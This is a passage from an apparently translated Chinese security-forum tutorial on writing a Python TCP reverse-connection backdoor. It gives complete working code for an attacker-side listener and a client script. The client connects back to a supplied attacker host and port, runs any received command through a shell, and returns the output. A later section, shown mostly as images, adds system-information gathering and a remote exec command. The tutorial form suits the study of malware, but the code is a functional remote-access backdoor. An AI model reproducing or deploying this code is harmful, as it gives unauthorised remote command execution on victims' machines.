plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 最大连接数:100</code></div><div class="line number12 index11 alt1"><code class="python plain">conn,addr&nbsp; </code><code class="python keyword">=</code> <code class="python plain">s.accept()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 接收客户端连接</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python comments"># 3）输出连接信息</code></div><div class="line number15 index14 alt2"><code class="python functions">print</code> <code class="python string">"[+] Conection Established from: %s"</code> <code class="python keyword">%</code> <code class="python plain">(</code><code class="python functions">str</code><code class="python plain">(addr[</code><code class="python value">0</code><code class="python plain">]))</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 打印攻击者的连接信息</code></div><div class="line number17 index16 alt2"><code class="python comments"># 4）接收输出</code></div><div class="line number18 index17 alt1"><code class="python keyword">while</code> <code class="python value">1</code><code class="python plain">:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 运行死循环初始化反向的连接</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">command </code><code class="python keyword">=</code> <code class="python functions">raw_input</code><code class="python plain">(</code><code class="python string">"#&gt; "</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 服务器输入</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 5）if判断-1</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">command !</code><code class="python keyword">=</code> <code class="python string">"exit()"</code><code class="python plain">:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 如果命令不是exit()，那就继续执行</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 6）if判断-2</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">"": </code><code class="python keyword">continue</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code class="python comments"># 命令如果为空，循环这个函数</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 7）发送、接收命令</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.send(command)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 发送命令到客户端</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">conn.recv(</code><code class="python value">1024</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 接收并输出</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 8） 处理接收结果</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">total_size </code><code class="python keyword">=</code> <code class="python functions">long</code><code class="python plain">(result[:</code><code class="python value">16</code><code class="python plain">])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 获取返回数据的大小,取出前16位的值</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">result[</code><code class="python value">16</code><code class="python plain">:]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 接收数据的结果，取16位之后的值</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 9） 处理数据</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">total_size &gt; </code><code class="python functions">len</code><code class="python plain">(result):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 循环函数</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">conn.recv(</code><code class="python value">1024</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 每次接收1024的数据，如果发送的数据大于现在接收的数据</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 循环接收并且拼接起来</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 10）打印结果过滤换行符</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">result.rstrip(</code><code class="python string">"\n"</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 过滤掉换行符</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.send(</code><code class="python string">"exit()"</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 发送客户端关闭的消息</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"[+] shell Going Down"</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code class="python comments"># 本地退出提示</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number40 index39 alt1"><code class="python comments"># 11）出现任何故障关闭套接字</code></div><div class="line number41 index40 alt2"><code class="python plain">s.close()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 关闭网络套接字</code></div></div></td></tr></tbody></table><p><strong>connect.py</strong></p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/python</code></div><div class="line number2 index1 alt1"><code class="python comments">#coding:utf-8</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python keyword">import</code> <code class="python plain">socket,subprocess as sp,sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 导入subprocess，socket模块</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python comments"># 1）连接信息</code></div><div class="line number7 index6 alt2"><code class="python plain">host </code><code class="python keyword">=</code> <code class="python plain">sys.argv[</code><code class="python value">1</code><code class="python plain">]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 攻击者地址，通常留空''</code></div><div class="line number8 index7 alt1"><code class="python plain">port </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(sys.argv[</code><code class="python value">2</code><code class="python plain">])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 攻击者主机端口</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python comments"># 2）套接字部分</code></div><div class="line number11 index10 alt2"><code class="python plain">conn </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET,socket.SOCK_STREAM) </code><code class="python comments"># 安装套接字</code></div><div class="line number12 index11 alt1"><code class="python plain">conn.connect((host,port))</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python keyword">while</code> <code class="python value">1</code><code class="python plain">:</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">command </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(conn.recv(</code><code class="python value">1024</code><code class="python plain">))</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">command !</code><code class="python keyword">=</code> <code class="python string">"exit()"</code><code class="python plain">:</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">sp.Popen(command,shell</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">,</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stdout</code><code class="python keyword">=</code><code class="python plain">sp.PIPE,</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stderr</code><code class="python keyword">=</code><code class="python plain">sp.PIPE,</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stdin</code><code class="python keyword">=</code><code class="python plain">sp.PIPE)</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">out,err </code><code class="python keyword">=</code> <code class="python plain">sh.communicate()&nbsp;&nbsp; </code><code class="python comments"># 与进程交互：将数据发送到标准输入。从标准输出和标准错误读取数据，直至到达文件末尾。</code></div><div class="line number24 index23 alt1">&nbsp;</div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(out) </code><code class="python keyword">+</code> <code class="python functions">str</code><code class="python plain">(err)</code></div><div class="line number26 index25 alt1">&nbsp;</div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">length </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(</code><code class="python functions">len</code><code class="python plain">(result)).zfill(</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.send(length </code><code class="python keyword">+</code> <code class="python plain">result)</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2">&nbsp;</div><div class="line number34 index33 alt1"><code class="python plain">conn.close()</code></div></div></td></tr></tbody></table><h1><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>0x2 第二部分：美化Shell界面</h1><p>　　在第二部分教程中，我们会把服务器端脚本的Shell界面进行美化。</p>
<h2><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>2.1 服务端代码</h2><h3><a name="import-导入模块声明" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#import-%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97%E5%A3%B0%E6%98%8E"><span class="header-link"></span></a>Import-导入模块声明</h3><p>　　我们导入模块声明的语句如下：</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/env python</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket, sys, os</code></div></div></td></tr></tbody></table><h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#colors()%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Colors()函数</h3><p>　　这个函数将把我们的Shell中的文本替换得更加美观。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_XW39K456B7U4QAS.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这个函数用指定的颜色来修饰传递给它的任何文本。接受的字符和显示颜色说明如下：</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python string">"r"</code> <code class="python keyword">or</code> <code class="python string">"red"</code> <code class="python keyword">-</code> <code class="python plain">Red</code></div><div class="line number2 index1 alt1"><code class="python string">"g"</code> <code class="python keyword">or</code> <code class="python string">"green"</code> <code class="python keyword">-</code> <code class="python plain">Green</code></div><div class="line number3 index2 alt2"><code class="python string">"b"</code> <code class="python keyword">or</code> <code class="python string">"blue"</code> <code class="python keyword">-</code> <code class="python plain">Blue</code></div><div class="line number4 index3 alt1"><code class="python string">"y"</code> <code class="python keyword">or</code> <code class="python string">"yellow"</code> <code class="python keyword">-</code> <code class="python plain">Yellow</code></div><div class="line number5 index4 alt2"><code class="python string">"lgray"</code> <code class="python keyword">-</code> <code class="python plain">Light Gray</code></div><div class="line number6 index5 alt1"><code class="python string">"underline"</code> <code class="python keyword">-</code> <code class="python plain">Underline Text</code></div><div class="line number7 index6 alt2"><code class="python string">"strike"</code> <code class="python keyword">-</code> <code class="python plain">Strikes Text</code></div></div></td></tr></tbody></table><h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#banner()%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Banner()函数</h3><p>　　这些介绍的基础函数不是必需要写的代码，但是改善了用户使用的体验感，具体的美化效果可以自己定制。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_VRCFMJMXMBTKBXP.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　编辑：我把“lgray”改成了“gray”。 我们可以根据个人喜好更改。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这个函数的具体作用是将程序说明文本的内容返回给调用者。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#main_control()%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Main_control()函数</h3><p>　　Main_control()函数的作用是接收服务器Socket套接字。在前面的文章中我们没有使用调用函数的方式编写代码，而是采用了过程化的代码。现在这些过程化代码被封装到Main_control()函数中，方便后续的修改。代码如下图所示：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_85MDMFYUBWAGRZE.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　看到这一坨代码请不要惊慌，我们只需要关注代码带来的脑力挑战即可。让我们分解一下代码开始解读吧？：</p>
<ul>
<li><p>1）我们接受Socket套接字信息后将其传递给相应的变量host、port变量</p>
</li>
<li><p>2）如果异常没有捕获到任何错误，则借助script_color()函数打印出"Framework Started<br>Successfully"</p>
</li>
<li><p>3）调用banner()函数，打印函数里的文本到界面上</p>
</li>
<li><p>4）设置Socket套接字，绑定和监听</p>
</li>
<li><p>5）开头已经将主机作为空字符串参数传递。所以我们在设置套接字后，如果参数为空就将主机字符串默认设为“localhost”</p>
</li>
<li><p>6）打印出"Listening on host address:port number ..."</p>
</li>
<li><p>7）等待接收Socket套接字信息连接，捕获到错误输入则打印错误中断提示</p>
</li>
<li><p>8）如果客户端顺利连接，就会将Socket套接字数据和主机地址作为参数传递进入console()控制台函数</p>
</li>
<li><p>9）当console()函数执行完毕后，关闭创建的Socket套接字</p>
</li>
</ul>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#console()%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Console()控制台函数</h3><p>　　这部分代码很容易令人灰心！只有坚持看下去才能渡过难关。console()控制台函数的代码如下：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_26VBRYNYWZ2RH64.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　以上的代码非常长，首先我们打印一个字符串表示从远程主机建立连接。然后我们从数据流中接收数据。数据流中包含有关于远程系统的信息（我们会在Client(客户端)执行）。以下是数据显示的布局内容：</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">系统类型</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python plain">计算机名称（节点名称）</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="python plain">发行版本</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="python plain">系统版本</code></div><div class="line number8 index7 alt1">&nbsp;</div><div class="line number9 index8 alt2"><code class="python plain">机器架构</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python plain">用户名</code></div></div></td></tr></tbody></table><p>　　所有信息都是来自OS模块的uname()和getlogin()函数（我们在Client(客户端)执行的代码）。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　使用收到的信息为Shell创建自定义提示名称，例如：root@127.0.0.1。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　然后我们进入while循环，该循环包含连接的命令。由于我们重新自定义了程序命令，因此原装操作系统命令类似于“ls -l”和其他linux命令将无法正常使用。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>下面是我们的前5条内置命令。</p>
<ol>
<li><p>exec——接收一个命令作为参数，并在远程主机上执行该命令。这是我们调用Linux命令的地方，例如：exec ls -l</p>
</li>
<li><p>cls - 清除终端显示的信息，使用默认的linux clear命令</p>
</li>
<li><p>help - 调用help函数打印帮助文本</p>
</li>
<li><p>sysinfo - 打印出收到的远程系统信息</p>
</li>
<li><p>exit() - 向远程shell发送一个停止命令，在本地退出控制界面。</p>
</li>
<li><p>任何非指定的命令都不会被接受，并且会在else语句中打印一条错误消息。</p>
</li>
</ol>
<p>　　在内置的exec命令中，不会有任何的参数被传递并且会输出一个错误消息。我们在exec命令中有一个新的函数send_data。它接受连接流和要执行的命令。负责自动处理数据的发送和接收。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这段代码读者最好可以自己动手写一遍，这样就可以在代码运行后进行修改。如果在写作过程中进行修改的话，可能会导致很多问题。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#help()%E5%B8%AE%E5%8A%A9%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>help()帮助函数</h3><p>　　所有内置在这个框架(脚本)中的命令都将在这里说明。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_84W5TQDUYUKT28G.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这个函数会按照顺序打印一个help_list字典，并对字符进行美化处理后循环输出来。</p>
